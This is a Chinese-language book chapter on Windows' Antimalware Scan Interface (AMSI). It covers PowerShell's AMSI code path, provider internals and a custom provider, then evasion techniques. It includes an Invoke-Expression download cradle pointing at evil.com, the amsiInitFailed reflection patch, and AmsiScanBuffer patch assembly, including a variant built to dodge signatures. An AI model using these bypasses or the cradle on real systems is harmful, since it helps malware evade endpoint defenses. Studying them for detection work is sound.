# 第十章：10 恶意软件扫描接口

![](img/opener-img.png)

随着安全厂商开始构建有效的工具来检测编译恶意软件的部署和执行，攻击者开始寻找其他方法来执行他们的代码。他们发现的一种战术是创建基于脚本的或*无文件*恶意软件，这依赖于操作系统内置工具的使用，以执行能够让攻击者控制系统的代码。

为了帮助保护用户免受这些新型威胁，微软在发布 Windows 10 时引入了*恶意软件扫描接口（AMSI）*。AMSI 提供了一个接口，允许应用程序开发者在确定其处理的数据是否恶意时，利用系统上注册的恶意软件防护提供商。

AMSI 是当今操作环境中无处不在的安全特性。微软已经为我们这些攻击者经常针对的许多脚本引擎、框架和应用程序进行了相应的配置。几乎所有的 EDR 厂商都会采集 AMSI 的事件，有些甚至会尝试检测那些篡改注册提供商的攻击。本章将介绍 AMSI 的历史、它在不同 Windows 组件中的实现以及 AMSI 绕过技术的多样性。

## 基于脚本的恶意软件挑战

脚本语言相比编译语言具有许多优势。它们需要更少的开发时间和开销，可以绕过应用程序白名单，能够在内存中执行，并且具有良好的可移植性。它们还提供了使用如 .NET 等框架特性的能力，并且通常可以直接访问 Win32 API，从而大大扩展了脚本语言的功能。

尽管在 AMSI 创建之前就有基于脚本的恶意软件存在，但 2015 年发布的 Empire（一个围绕 PowerShell 构建的命令与控制框架）使其在进攻领域成为主流。由于其易用性、与 Windows 7 及以上版本的默认集成以及大量现有文档，PowerShell 成为了许多人的进攻工具开发事实标准语言。

脚本式恶意软件的兴起造成了一个巨大的防御漏洞。之前的工具依赖于恶意软件会被写入磁盘并执行的事实。当面对运行在系统中由 Microsoft 签名并默认安装的可执行文件时，它们显得无能为力，这类恶意软件通常被称为*living-off-the-land*，例如 PowerShell。即便是那些试图检测恶意脚本调用的代理，也难以应对，因为攻击者可以轻松地调整其负载和工具，以避开供应商采用的检测技术。Microsoft 在其博客中明确指出了这一问题，并在宣布 AMSI 时给出了以下示例。假设一个防御产品搜索脚本中的字符串“malware”以判断其是否恶意。它会检测到以下代码：

```
PS > **Write-Host "malware";**
```

一旦恶意软件作者意识到这种检测逻辑，他们就可以通过像字符串拼接这样简单的方式绕过检测机制：

```
PS > **Write-Host "mal" + "ware";**
```

为了应对这一问题，开发人员通常会尝试进行某种基本类型的语言仿真。例如，他们可能会在扫描脚本块内容之前将字符串拼接起来。不幸的是，这种方法容易出错，因为不同的语言常常有多种方式来表示数据，而对它们进行仿真非常困难。然而，反恶意软件开发人员在这一技术上确实取得了一定的成功。因此，恶意软件开发者通过编码等技术略微提高了混淆的复杂度。Listing 10-1 中的示例展示了在 PowerShell 中使用 Base64 编码的字符串“malware”。

```
PS > **$str = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(**
**>> "bWFsd2FyZQ=="));**
PS > **Write-Host $str;**
```

Listing 10-1: 在 PowerShell 中解码 Base64 字符串

代理再次利用语言仿真解码脚本中的数据，并扫描其是否包含恶意内容。为了应对这一成功，恶意软件开发者将策略从简单的编码转向了加密和算法编码，例如使用异或（XOR）。例如，Listing 10-2 中的代码首先解码 Base64 编码的数据，然后使用两个字节的密钥gg对解码后的字节进行 XOR 运算。

```
$key = "gg"
$data = "CgYLEAYVAg=="
$bytes = [System.Convert]::FromBase64String($data);

$decodedBytes = @();
for ($i = 0; $i -lt $bytes.Count; $i++) {
    $decodedBytes += $bytes[$i] -bxor $key[$i % $key.Length];
}
$payload = [system.Text.Encoding]::UTF8.getString($decodedBytes);
Write-Host $payload;
```

Listing 10-2: PowerShell 中的 XOR 示例

这种加密趋势超出了反恶意软件引擎能够合理仿真的范围，因此基于混淆技术本身存在的检测变得普遍。这也带来了自身的挑战，因为正常的、无害的脚本有时也会使用看似混淆的技术。Microsoft 在其帖子中提出的示例，成为了在内存中执行 PowerShell 代码的标准之一，即 Listing 10-3 中的下载框架。

```
PS > **Invoke-Expression (New-Object Net.Webclient).**
**>> downloadstring("****https://evil.com/payloadl.ps1")**
```

Listing 10-3: 一个简单的 PowerShell 下载框架

在这个示例中，.NET 的 Net.Webclient 类用于从任意站点下载 PowerShell 脚本。当这个脚本被下载时，它不会写入磁盘，而是作为字符串存在于内存中，与 Webclient 对象绑定。接着，攻击者使用 Invoke-Expression cmdlet 将这个字符串作为 PowerShell 命令执行。这种技术使得载荷的任何操作（例如部署新的命令与控制代理）完全在内存中发生。

## AMSI 的工作原理

AMSI 扫描一个目标，然后使用系统上注册的反恶意软件提供程序来确定它是否是恶意的。默认情况下，它使用反恶意软件提供程序 Microsoft Defender IOfficeAntivirus（*MpOav.dll*），但第三方 EDR 供应商也可以注册他们自己的提供程序。Duane Michael 在他的 GitHub 项目“whoamsi”中维护了一个注册 AMSI 提供程序的安全供应商列表。

AMSI 最常见的应用场景是由包含脚本引擎的应用程序使用（例如，接受任意脚本并使用相关引擎执行它们的应用程序），处理内存中不可信的缓冲区，或与非 PE 可执行代码（如 *.docx* 和 *.pdf* 文件）交互。AMSI 已集成到许多 Windows 组件中，包括现代版本的 PowerShell、.NET、JavaScript、VBScript、Windows 脚本宿主、Office VBA 宏和用户帐户控制（UAC）。它还集成到 Microsoft Exchange 中。

### 探索 PowerShell 的 AMSI 实现

由于 PowerShell 是开源的，我们可以检查其 AMSI 实现，以了解 Windows 组件如何使用这个工具。在本节中，我们将探讨 AMSI 如何尝试限制应用程序执行恶意脚本。

在 *System.Management.Automation.dll* 中，这个 DLL 提供了托管 PowerShell 代码的运行时环境，其中存在一个非导出的函数 PerformSecurityChecks()，负责扫描提供的脚本块并确定它是否是恶意的。这个函数由 PowerShell 创建的命令处理器在编译前的执行管道中调用。示例 10-4 中的调用栈，在 dnSpy 中捕获，展示了脚本块在被扫描之前的执行路径。

```
System.Management.Automation.dll!CompiledScriptBlockData.PerformSecurityChecks()
System.Management.Automation.dll!CompiledScriptBlockData.ReallyCompile(bool optimize)
System.Management.Automation.dll!CompiledScriptBlockData.CompileUnoptimized()
System.Management.Automation.dll!CompiledScriptBlockData.Compile(bool optimized)
System.Management.Automation.dll!ScriptBlock.Compile(bool optimized)
System.Management.Automation.dll!DlrScriptCommandProcessor.Init()
System.Management.Automation.dll!DlrScriptCommandProcessor.DlrScriptCommandProcessor(Script
    Block scriptBlock, ExecutionContext context, bool useNewScope, CommandOrigin origin,
    SessionStateInternal sessionState, object dollarUnderbar)
System.Management.Automation.dll!Runspaces.Command.CreateCommandProcessor(ExecutionContext
    executionContext, bool addToHistory, CommandOrigin origin)
System.Management.Automation.dll!Runspaces.LocalPipeline.CreatePipelineProcessor()
System.Management.Automation.dll!Runspaces.LocalPipeline.InvokeHelper()
System.Management.Automation.dll!Runspaces.LocalPipeline.InvokeThreadProc()
System.Management.Automation.dll!Runspaces.LocalPipeline.InvokeThreadProcImpersonate()
System.Management.Automation.dll!Runspaces.PipelineThread.WorkerProc()
System.Private.CoreLib.dll!System.Threading.Thread.StartHelper.RunWorker()
System.Private.CoreLib.dll!System.Threading.Thread.StartHelper.Callback(object state)
System.Private.CoreLib.dll!System.Threading.ExecutionContext.RunInternal(`--snip--`) System.Private.CoreLib.dll!System.Threading.Thread.StartHelper.Run()
System.Private.CoreLib.dll!System.Threading.Thread.StartCallback()
[Native to Managed Transition]
```

示例 10-4：扫描 PowerShell 脚本块时的调用栈

此函数调用一个内部工具 AmsiUtils.ScanContent()，将要扫描的脚本块或文件传递给它。这个工具是另一个内部函数 AmsiUtils.WinScanContent() 的简单包装器，所有的实际工作都在这个函数中进行。

在检查脚本块是否包含欧洲计算机防病毒研究所（EICAR）测试字符串后，所有防病毒软件必须检测该字符串，WinScanContent 的第一个操作是通过调用 amsi!AmsiOpenSession() 创建一个新的 AMSI 会话。AMSI 会话用于关联多个扫描请求。接下来，WinScanContent() 调用 amsi!AmsiScanBuffer()，这是 Win32 API 函数，会调用系统上注册的 AMSI 提供程序，并返回最终关于脚本块恶意性的判定。列表 10-5 展示了 PowerShell 中的这一实现，去除了不相关的部分。

```
lock (s_amsiLockObject)
{
    `--snip--`

    if (s_amsiSession == IntPtr.Zero)
    {
      ❶ hr = AmsiNativeMethods.AmsiOpenSession(
          s_amsiContext,
          ref s_amsiSession
        );

        AmsiInitialized = true;

        if (!Utils.Succeeded(hr))
        {
            s_amsiInitFailed = true;
            return AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_NOT_DETECTED;
        }
    }

    `--snip--`

    AmsiNativeMethods.AMSI_RESULT result =
      AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_CLEAN;

    unsafe
    {
        fixed (char* buffer = content)
        {
          var buffPtr = new IntPtr(buffer);
        ❷ hr = AmsiNativeMethods.AmsiScanBuffer(
              s_amsiContext,
              buffPtr, (uint)(content.Length * sizeof(char)),
              sourceMetadata,
              s_amsiSession,
              ref result);
      }
    }

    if (!Utils.Succeeded(hr))
    {
      return AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_NOT_DETECTED;
    }
    return result;
}
```

列表 10-5：PowerShell 的 AMSI 实现

在 PowerShell 中，代码首先调用 amsi!AmsiOpenSession() ❶ 来创建一个新的 AMSI 会话，扫描请求可以在该会话中进行关联。如果会话成功打开，要扫描的数据会传递给 amsi!AmsiScanBuffer() ❷，该函数会实际评估数据，以确定缓冲区的内容是否看起来具有恶意。此调用的结果会返回给 WinScanContent()。

WinScanContent() 函数可以返回三个值中的一个：

AMSI_RESULT_NOT_DETECTED   中性结果

AMSI_RESULT_CLEAN   表示脚本块不包含恶意软件的结果

AMSI_RESULT_DETECTED   表示脚本块包含恶意软件的结果

如果返回前两个结果中的任何一个，表示 AMSI 无法确定脚本块是否具有恶意，或者认为它不危险，则该脚本块将被允许在系统上执行。然而，如果返回 AMSI_RESULT_DETECTED 结果，将抛出一个 ParseException，并会停止脚本块的执行。列表 10-6 展示了如何在 PowerShell 中实现此逻辑。

```
if (amsiResult == AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED)
{
    var parseError = new ParseError(
        scriptExtent,
        "ScriptContainedMaliciousContent",
        ParserStrings.ScriptContainedMaliciousContent);
 ❶ throw new ParseException(new[] {parseError});
}
```

列表 10-6：在检测到恶意脚本时抛出 ParseError

由于 AMSI 抛出了一个异常 ❶，脚本的执行被停止，并且在 ParseError 中显示的错误将返回给用户。列表 10-7 展示了用户在 PowerShell 窗口中看到的错误。

```
PS > **Write-Host "malware"**
ParserError:
Line |
    1 | Write-Host "malware"
      | ~~~~~~~~~~~~~~~~~~~~
      | This script contains malicious content and has been blocked by your
      | antivirus software.
```

列表 10-7：显示给用户的错误

### 深入了解 AMSI

虽然了解 AMSI 在系统组件中的应用有助于理解用户输入是如何被评估的，但它并没有完全讲述整个故事。当 PowerShell 调用 amsi!AmsiScanBuffer() 时会发生什么？要理解这一点，我们必须深入研究 AMSI 实现本身。由于目前 C++ 反编译器的状态使得静态分析有点棘手，我们需要使用一些动态分析技术。幸运的是，WinDbg 使这个过程相对轻松，特别是考虑到 *amsi.dll* 的调试符号是可用的。

当 PowerShell 启动时，它首先调用 amsi!AmsiInitialize()。顾名思义，这个函数负责初始化 AMSI API。此初始化主要集中在通过调用 DllGetClassObject() 创建 COM 类工厂。作为参数，它接收与 *amsi.dll* 相关的类标识符，以及为 IClassFactory 标识的接口，后者允许创建对象类。接口指针随后用于创建 IAntimalware 接口的实例（{82d29c2e-f062-44e6-b5c9-3d9a2f24a2df}），如 示例 10-8 所示。

```
Breakpoint 4 hit
amsi!AmsiInitialize+0x1a9:
00007ff9`5ea733e9 ff15899d0000  call  qword ptr [amsi!_guard_dispatch_icall_fptr] `--snip--`

0:011> **dt OLE32!IID @r8**
 {82d29c2e-f062-44e6-b5c9-3d9a2f24a2df}
  +0x000 Data1            : 0x82d29c2e
  +0x004 Data2            : 0xf062
  +0x006 Data3            : 0x44e6
  +0x008 Data4            : [8] "???"

0:011> **dt @rax**
ATL::CComClassFactory::CreateInstance
```

示例 10-8：创建 IAntimalware 实例

与明确调用某些函数不同，你偶尔会发现对 _guard_dispatch_icall_fptr() 的引用。这是控制流保护（CFG）的一部分，一种防止利用攻击的技术，旨在防止间接调用，例如在返回导向编程的情况下。简而言之，这个函数检查源映像的控制流保护位图，以确定要调用的函数是否是有效目标。在本节的上下文中，读者可以将这些视为简单的 CALL 指令，以减少混淆。

该调用最终会进入 amsi!AmsiComCreateProviders<IAntimalwareProvider>，在那里所有的“魔法”发生。 示例 10-9 显示了在 WinDbg 中此方法的调用堆栈。

```
0:011> **kc**
 # Call Site
00 amsi!AmsiComCreateProviders<IAntimalwareProvider>
01 amsi!CamsiAntimalware::FinalConstruct
02 amsi!ATL::CcomCreator<ATL::CcomObject<CamsiAntimalware> >::CreateInstance
03 amsi!ATL::CcomClassFactory::CreateInstance
04 amsi!AmsiInitialize
`--snip--`
```

示例 10-9：AmsiComCreateProviders 函数的调用堆栈

第一个主要操作是调用amsi!CGuidEnum::StartEnum()。该函数接收字符串"Software\\Microsoft\\AMSI\\Providers"，并将其传递给RegOpenKey()，然后调用RegQueryInfoKeyW()以获取子键的数量。接着，amsi!CGuidEnum::NextGuid()遍历子键，并将注册的 AMSI 提供程序的类标识符从字符串转换为 UUID。枚举所有所需的类标识符后，它将执行传递给amsi!AmsiComSecureLoadInProcServer()，在那里通过RegGetValueW()查询与 AMSI 提供程序对应的<sup class="SANS_TheSansMonoCd_W5Regular_11">InProcServer32</sup>值。Listing 10-10 展示了这一过程，针对 *MpOav.dll*。

```
0:011> **u @rip L1**
amsi!AmsiComSecureLoadInProcServer+0x18c:
00007ff9`5ea75590 48ff1589790000  call    qword ptr [amsi!_imp_RegGetValueW]

0:011> **du @rdx**
00000057`2067eaa0  "Software\Classes\CLSID\{2781761E"
00000057`2067eae0  "-28E0-4109-99FE-B9D127C57AFE}\In"
00000057`2067eb20  "procServer32"
```

Listing 10-10: 传递给RegGetValueW的参数

接下来，调用amsi!CheckTrustLevel()，检查注册表项*SOFTWARE\Microsoft\AMSI\FeatureBits*的值。此键包含一个 DWORD，可以是1（默认值）或2，用于禁用或启用提供程序的 Authenticode 签名检查。如果启用了 Authenticode 签名检查，将验证在InProcServer32注册表项中列出的路径。在成功验证后，该路径将传递给LoadLibraryW()以加载 AMSI 提供程序 DLL，如 Listing 10-11 所示。

```
0:011> **u @rip L1**
amsi!AmsiComSecureLoadInProcServer+0x297:
00007ff9`5ea7569b 48ff15fe770000  call    qword ptr [amsi!_imp_LoadLibraryExW] 0:011> **du @rcx**
00000057`2067e892 "C:\ProgramData\Microsoft\Windows"
00000057`2067e8d2 " Defender\Platform\4.18.2111.5-0"
00000057`2067e912 "\MpOav.dll"
```

Listing 10-11: 通过LoadLibraryW()加载 MpOav.dll

如果提供程序 DLL 加载成功，将调用其DllRegisterServer()函数，告知它为提供程序支持的所有 COM 类创建注册表项。这个循环会重复调用amsi!CGuidEnum::NextGuid()，直到所有提供程序都被加载。Listing 10-12 展示了最终步骤：调用每个提供程序的QueryInterface()方法，以获得指向IAntimalware接口的指针。

```
0:011> **dt OLE32!IID @rdx**
  {82d29c2e-f062-44e6-b5c9-3d9a2f24a2df}
  +0x000 Data1            : 0x82d29c2e
  +0x004 Data2            : 0xf062
  +0x006 Data3            : 0x44e6
  +0x008 Data4            : [8] "???"

0:011> **u @rip L1**
amsi!ATL::CComCreator<ATL::CComObject<CAmsiAntimalware> >::CreateInstance+0x10d:
00007ff8`0b7475bd ff15b55b0000  call  qword ptr [amsi!_guard_dispatch_icall_fptr]

0:011> **t**
amsi!ATL::CComObject<CAmsiAntimalware>::QueryInterface:
00007ff8`0b747a20 4d8bc8       mov         r9,r8
```

Listing 10-12: 对已注册提供程序调用QueryInterface

在 AmsiInitialize() 返回之后，AMSI 已经准备好工作。在 PowerShell 开始评估脚本块之前，它会调用 AmsiOpenSession()。如前所述，该函数允许 AMSI 关联多个扫描。当此函数完成时，它会返回一个 HAMSISESSION 给调用者，调用者可以选择将此值传递给当前扫描会话中的所有后续 AMSI 调用。

当 PowerShell 的 AMSI 插装接收到脚本块并且 AMSI 会话已经打开时，它会调用 AmsiScanBuffer()，并将脚本块作为输入传递给该函数。该函数在列表 10-13 中进行了定义。

```
HRESULT AmsiScanBuffer(
  [in]            HAMSICONTEXT amsiContext,
  [in]            PVOID        buffer,
  [in]            ULONG        length,
  [in]            LPCWSTR      contentName,
  [in, optional]  HAMSISESSION amsiSession,
  [out]           AMSI_RESULT  *result
);
```

列表 10-13: AmsiScanBuffer() 定义

该函数的主要职责是检查传递给它的参数的有效性。这包括检查输入缓冲区的内容以及是否存在带有标签AMSI的有效 HAMSICONTEXT 句柄，正如你在列表 10-14 中的反汇编中看到的。如果这些检查中的任何一个失败，函数会向调用者返回 E_INVALIDARG (0x80070057)。

```
if (!buffer)
 return 0x80070057;
if (!length)
 return 0x80070057;
if (!result)
 return 0x80070057;
if (!amsiContext)
 return 0x80070057;
if (*amsiContext != 'ISMA')
 return 0x80070057;
if (!*(amsiContext + 1))
 return 0x80070057;
v10 = *(amsiContext + 2);
if (!v10)
 return 0x80070057;
```

列表 10-14: 内部 AmsiScanBuffer() 合理性检查

如果这些检查通过，AMSI 会调用 amsi!CAmsiAntimalware::Scan()，正如列表 10-15 中的调用栈所示。

```
0:023> **kc**
  # Call Site
00 amsi!CAmsiAntimalware::Scan
01 amsi!AmsiScanBuffer
02 System_Management_Automation_ni
`--snip--`
```

列表 10-15: 调用的 Scan() 方法

该方法包含一个 while 循环，循环遍历每个注册的 AMSI 提供程序（其数量存储在 R14 + 0x1c0）。在这个循环中，它调用 IAntimalwareProvider::Scan() 函数，EDR 供应商可以根据自己的需求来实现该函数；期望它返回一个 AMSI_RESULT，该结果在列表 10-16 中定义。

```
HRESULT Scan(
  [in]  IAmsiStream *stream,
  [out] AMSI_RESULT *result
);
```

列表 10-16: CAmsiAntimalware::Scan() 函数定义

对于默认的 Microsoft Defender AMSI 实现，即 *MpOav.dll*，该函数执行一些基本初始化工作，然后将执行交给 *MpClient.dll*，Windows Defender 客户端接口。请注意，微软并未为 Defender 组件提供程序数据库文件，因此 *MpOav.dll* 在列表 10-17 中的调用栈中的函数名是错误的。

```
0:000> **kc**
 # Call Site
00 MPCLIENT!MpAmsiScan
01 MpOav!DllRegisterServer
02 amsi!CAmsiAntimalware::Scan
03 amsi!AmsiScanBuffer
```

列表 10-17：从 MpOav.dll 传递到 MpClient.dll 的执行过程

AMSI 通过amsi!AmsiScanBuffer()将扫描结果返回给amsi!CAmsiAntimalware::Scan()，后者又将AMSI_RESULT返回给调用者。如果发现脚本块包含恶意内容，PowerShell 将抛出ScriptContainedMaliciousContent异常，并阻止其执行。

### 实现自定义 AMSI 提供程序

如前一节所述，开发人员可以根据需要实现IAntimalwareProvider::Scan()函数。例如，他们可以简单地记录要扫描内容的信息，或者将缓冲区的内容传递给训练好的机器学习模型，以评估其恶意性。为了理解所有供应商的 AMSI 提供程序的共享架构，本节将逐步介绍满足 Microsoft 定义的最低规格的简单提供程序 DLL 的设计。

本质上，AMSI 提供程序不过是*COM 服务器*，或者是加载到主机进程中的 DLL，它们暴露一个调用者所需的函数：在本例中是IAntimalwareProvider。此函数通过添加三个附加方法扩展了IUnknown接口：CloseSession通过其HAMSISESSION句柄关闭 AMSI 会话，DisplayName显示 AMSI 提供程序的名称，Scan扫描一个IAmsiStream内容并返回一个AMSI_RESULT。

在 C++中，重写IAntimalwareProvider方法的基本类声明可能类似于列表 10-18 中所示的代码。

```
class AmsiProvider :
        public RuntimeClass<RuntimeClassFlags<ClassicCom>,
        IAntimalwareProvider,
        FtmBase>
{
public:
    IFACEMETHOD(Scan)(
        IAmsiStream *stream,
        AMSI_RESULT *result
    ) override;

    IFACEMETHOD_(void, CloseSession)( ULONGLONG session
    ) override;

    IFACEMETHOD(DisplayName)(
        LPWSTR *displayName
    ) override;
};
```

列表 10-18：一个示例IAntimalwareProvider类定义

我们的代码利用了 Windows Runtime C++ 模板库，减少了创建 COM 组件时所需的代码量。CloseSession() 和 DisplayName() 方法被我们自己的函数重写，用于分别关闭 AMSI 会话和返回 AMSI 提供者的名称。Scan() 函数接收要扫描的缓冲区，作为 IAmsiStream 的一部分，后者暴露了两个方法，GetAttribute() 和 Read()，并在清单 10-19 中定义。

```
MIDL_INTERFACE("3e47f2e5-81d4-4d3b-897f-545096770373")
IAmsiStream : public IUnknown
{
public:
    virtual HRESULT STDMETHODCALLTYPE GetAttribute(
        /* [in] */ AMSI_ATTRIBUTE attribute,
        /* [range][in] */ ULONG dataSize,
        /* [length_is][size_is][out] */ unsigned char *data,
        /* [out] */ ULONG *retData) = 0;

    virtual HRESULT STDMETHODCALLTYPE Read(
        /* [in] */ ULONGLONG position,
        /* [range][in] */ ULONG size,
        /* [length_is][size_is][out] */ unsigned char *buffer,
        /* [out] */ ULONG *readSize) = 0;
};
```

清单 10-19：IAmsiStream 类定义

GetAttribute() 用于检索要扫描内容的元数据。开发者通过传递一个表示希望检索信息的 AMSI_ATTRIBUTE 值，以及适当大小的缓冲区来请求这些属性。AMSI_ATTRIBUTE 值是一个枚举类型，定义在清单 10-20 中。

```
typedef enum AMSI_ATTRIBUTE {
    AMSI_ATTRIBUTE_APP_NAME = 0,
    AMSI_ATTRIBUTE_CONTENT_NAME = 1,
    AMSI_ATTRIBUTE_CONTENT_SIZE = 2,
    AMSI_ATTRIBUTE_CONTENT_ADDRESS = 3,
    AMSI_ATTRIBUTE_SESSION = 4,
    AMSI_ATTRIBUTE_REDIRECT_CHAIN_SIZE = 5,
    AMSI_ATTRIBUTE_REDIRECT_CHAIN_ADDRESS = 6,
    AMSI_ATTRIBUTE_ALL_SIZE = 7,
    AMSI_ATTRIBUTE_ALL_ADDRESS = 8,
    AMSI_ATTRIBUTE_QUIET = 9 } AMSI_ATTRIBUTE;
```

清单 10-20：AMSI_ATTRIBUTE 枚举

虽然该枚举中有 10 个属性，但微软只记录了前五个：AMSI_ATTRIBUTE_APP_NAME 是一个包含调用应用程序的名称、版本或 GUID 的字符串；AMSI_ATTRIBUTE_CONTENT_NAME 是一个包含要扫描内容的文件名、URL、脚本 ID 或等效标识符的字符串；AMSI_ATTRIBUTE_CONTENT_SIZE 是一个 ULONGLONG 类型，表示要扫描数据的大小；AMSI_ATTRIBUTE_CONTENT_ADDRESS 是内容的内存地址（如果内容已完全加载到内存中）；而 AMSI_ATTRIBUTE_SESSION 包含指向下一个要扫描的内容部分的指针，或者如果内容是自包含的，则为 NULL。

作为示例，清单 10-21 展示了 AMIS 提供者如何使用该属性来检索应用程序名称。

```
HRESULT AmsiProvider::Scan(IAmsiStream* stream, AMSI_RESULT* result)
{
    HRESULT hr = E_FAIL;
    ULONG ulBufferSize = 0;
    ULONG ulAttributeSize = 0;
    PBYTE pszAppName = nullptr;

    hr = stream->GetAttribute(
        AMSI_ATTRIBUTE_APP_NAME,
        0,
        nullptr,
        &ulBufferSize
    );

    if (hr != E_NOT_SUFFICIENT_BUFFER)
    {
        return hr;
    }

    pszAppName = (PBYTE)HeapAlloc(
        GetProcessHeap(),
        0,
        ulBufferSize
    );

    if (!pszAppName)
    {
        return E_OUTOFMEMORY;
    }

    hr = stream->GetAttribute(
        AMSI_ATTRIBUTE_APP_NAME,
        ulBufferSize,
      ❶ pszAppName,
        &ulAttributeSize
    ); if (hr != ERROR_SUCCESS || ulAttributeSize > ulBufferSize)
    {
        HeapFree(
            GetProcessHeap(),
            0,
            pszAppName
        );

        return hr;
    }

    `--snip--`
}
```

清单 10-21：AMSI 扫描功能的实现

当 PowerShell 调用此示例函数时，pszAppName ❶将包含作为字符串的应用程序名称，AMSI 可以使用它来丰富扫描数据。如果脚本块被判定为恶意，这尤其有用，因为 EDR 可以利用应用程序名称终止调用进程。

如果AMSI_ATTRIBUTE_CONTENT_ADDRESS返回一个内存地址，我们就知道要扫描的内容已经完全加载到内存中，这样我们就可以直接与之交互。通常情况下，数据是以流的形式提供的，在这种情况下，我们使用Read()方法（在列表 10-22 中定义）逐个块地获取缓冲区的内容。我们可以定义这些块的大小，并将其与大小相同的缓冲区一起传递给Read()方法。

```
HRESULT Read(
  [in] ULONGLONG      position,
  [in] ULONG          size,
  [out] unsigned char *buffer,
  [out] ULONG         *readSize
);
```

列表 10-22：IAmsiStream::Read()方法定义

服务提供者如何处理这些数据块完全取决于开发人员。他们可以扫描每个数据块，读取完整流并对其内容进行哈希，或者只是记录相关的详细信息。唯一的规则是，当Scan()方法返回时，它必须将HRESULT和AMSI_RESULT返回给调用者。

## 规避 AMSI

AMSI 是与规避相关的研究最多的领域之一。这在很大程度上归功于其早期的高效性，曾给大量依赖 PowerShell 的进攻性团队带来显著的困扰。对于他们来说，AMSI 呈现了一种生死存亡的危机，阻止了他们的主要代理正常运行。

攻击者可以采用多种规避技术来绕过 AMSI。虽然某些厂商曾尝试标记其中一些为恶意，但 AMSI 中存在的规避机会数量庞大，因此厂商通常无法应对所有的规避手段。本节将介绍一些当前操作环境中较为流行的规避方法，但请记住，每种技术都有许多变种。

### 字符串混淆

AMSI 的最早规避之一是简单的字符串混淆。如果攻击者能够确定脚本块中哪个部分被标记为恶意，他们通常可以通过拆分、编码或以其他方式掩盖字符串，绕过检测，如列表 10-23 中的示例所示。

```
PS > **AmsiScanBuffer**
At line:1 char:1
+ AmsiScanBuffer
+ ~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
  + CategoryInfo : ParserError: (:) [], ParentContainsErrorRecordException
  + FullyQualifiedErrorId : ScriptContainedMaliciousContent

PS > **"Ams" + "iS" + "can" + "Buff" + "er"**
AmsiScanBuffer

PS > **$b = [System.Convert]::FromBase64String("QW1zaVNjYW5CdWZmZXI=")**
PS > **[System.Text.Encoding]::UTF8.GetString($b)**
AmsiScanBuffer
```

列表 10-23：PowerShell 中字符串混淆的示例，能够规避 AMSI

AMSI 通常会将字符串 AmsiScanBuffer 标记为恶意，这是基于补丁的规避方式中常见的组成部分，但在这里你可以看到字符串拼接可以帮助我们绕过检测。AMSI 实现通常会接收到混淆的代码，然后将其传递给提供程序，以确定其是否为恶意代码。这意味着提供程序必须处理语言模拟函数，如字符串拼接、解码和解密。然而，包括微软在内的许多提供程序甚至无法检测到像这里展示的这种简单绕过。

### AMSI 补丁

由于 AMSI 及其关联的提供程序被映射到攻击者的进程中，攻击者能够控制这些内存。通过补丁 *amsi.dll* 中的关键值或函数，攻击者可以防止 AMSI 在其进程中正常工作。这种规避技术非常强大，自 2016 年左右 Matt Graeber 讨论在 PowerShell 中使用反射来将 amsiInitFailed 补丁设置为 true 以来，已经成为许多红队的首选方法。他的代码被包含在 Listing 10-24 中，甚至能适配到一条推文中。

```
PS > [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
>> GetField('amsiInitFailed','NonPublic,Static'.SetValue($null,$true)
```

Listing 10-24：一个简单的 AmsiInitFailed 补丁

在进行补丁时，攻击者通常会针对 AmsiScanBuffer() 这个函数，它负责将缓冲区内容传递给提供程序。Daniel Duggan 在一篇博客文章《内存补丁 AMSI 绕过》中描述了这一技巧，在文章中他概述了攻击者的代码在执行任何真正的恶意活动之前必须采取的步骤：

1.  获取当前加载到进程中的 *amsi.dll* 中 AmsiScanBuffer() 的地址。

1.  使用 kernel32!VirtualProtect() 将内存保护更改为可读写模式，这样攻击者就可以放置补丁。

1.  将补丁复制到 AmsiScanBuffer() 函数的入口点。

1.  再次使用 kernel32!VirtualProtect() 恢复内存保护为可读执行模式。

补丁本身利用了一个事实，即在内部，如果其初始检查失败，AmsiScanBuffer() 将返回 E_INVALIDARG。这些检查包括尝试验证要扫描的缓冲区的地址。Duggan 的代码添加了一个表示 列表 10-25 中汇编代码的字节数组。在这个补丁之后，当执行 AmsiScanBuffer() 时，它将立即返回这个错误代码，因为构成原始函数的实际指令已被覆盖。

```
mov eax, 0x80070057 ; E_INVALIDARG
ret
```

列表 10-25：在补丁后返回给 AmsiScanBuffer() 的错误代码

这种技术有许多变体，它们都工作原理非常相似。例如，攻击者可能会修改 AmsiOpenSession() 而不是 AmsiScanBuffer()。他们也可以选择破坏传入 AmsiScanBuffer() 的参数之一，如缓冲区长度或上下文，导致 AMSI 自行返回 E_INVALIDARG。

微软很快意识到了这种逃避技术，并采取措施防止绕过。它实施的检测之一基于我们描述的补丁所组成的操作码序列。然而，攻击者可以通过多种方式规避这些检测。例如，他们可以简单地修改他们的汇编代码以达到相同的结果，将 0x80070057 移入 EAX 并返回，这样的方式不那么直接。请考虑 第 10-26 列表 中的示例，该示例将值 0x80070057 分解，而不是一次性将其移入寄存器。

```
xor eax, eax ; Zero out EAX
add eax, 0x7459104a
add eax, 0xbadf00d
ret
```

列表 10-26：分解硬编码值以规避补丁检测

想象一下，EDR 寻找将值 0x80070057 移入 EAX 寄存器的情况。这种逃避策略将绕过其检测逻辑，因为该值从未被直接引用。相反，它被分解成两个值，这两个值恰好加起来等于所需值。

### 无需补丁的 AMSI 绕过

在 2022 年 4 月，Ceri Coburn 揭示了一种绕过 AMSI 的技术，而无需对 *amsi.dll* 进行补丁，这是许多 EDR 供应商已经开始监控的活动。Coburn 的技术也不需要分叉和运行，允许攻击者保持在他们的原始进程中。

这个技术相当巧妙。首先，攻击者从加载的 *amsi.dll* 中获取 amsi!AmsiScanBuffer() 的函数指针，或者通过调用 LoadLibrary() 强制其加载到进程中。接着，他们通过 kernel32!AddVectoredExceptionHandler() 注册一个矢量异常处理程序。这个处理程序允许开发者注册一个函数来监控和管理应用中的所有异常。最后，他们通过修改当前线程的调试寄存器（DR0、DR6 和 DR7）在 AmsiScanBuffer() 的地址上设置硬件断点。

